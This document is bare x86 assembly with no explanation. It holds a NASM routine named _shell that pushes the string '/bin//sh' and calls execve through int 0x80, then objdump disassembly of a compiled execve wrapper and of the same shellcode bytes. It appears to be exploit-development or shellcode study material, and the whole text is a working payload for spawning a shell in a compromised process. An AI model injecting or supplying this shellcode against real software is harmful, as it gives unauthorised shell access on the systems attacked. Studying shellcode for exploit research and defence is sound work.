global _shell

_shell:
  xor ecx, ecx
  mul ecx
  push ecx
  push 0x68732f2f  
  push 0x6e69622f 
  mov ebx, esp
  mov al, 11
  int 0x80


 8048a58:	55                   	push   %ebp
 8048a59:	89 e5                	mov    %esp,%ebp
 8048a5b:	83 ec 28             	sub    $0x28,%esp
 8048a5e:	c7 45 f0 a5 9a 04 08 	movl   $0x8049aa5,-0x10(%ebp)
 8048a65:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
 8048a6c:	8b 45 f0             	mov    -0x10(%ebp),%eax
 8048a6f:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
 8048a76:	00 
 8048a77:	8d 55 f0             	lea    -0x10(%ebp),%edx
 8048a7a:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048a7e:	89 04 24             	mov    %eax,(%esp)
 8048a81:	e8 f6 fb ff ff       	call   804867c <execve@plt>
 8048a86:	c9                   	leave  
 8048a87:	c3                   	ret   

 8048890:	31 c9                	xor    %ecx,%ecx
 8048892:	f7 e1                	mul    %ecx
 8048894:	51                   	push   %ecx
 8048895:	68 2f 2f 73 68       	push   $0x68732f2f
 804889a:	68 2f 62 69 6e       	push   $0x6e69622f
 804889f:	89 e3                	mov    %esp,%ebx
 80488a1:	b0 0b                	mov    $0xb,%al
 80488a3:	cd 80                	int    $0x80

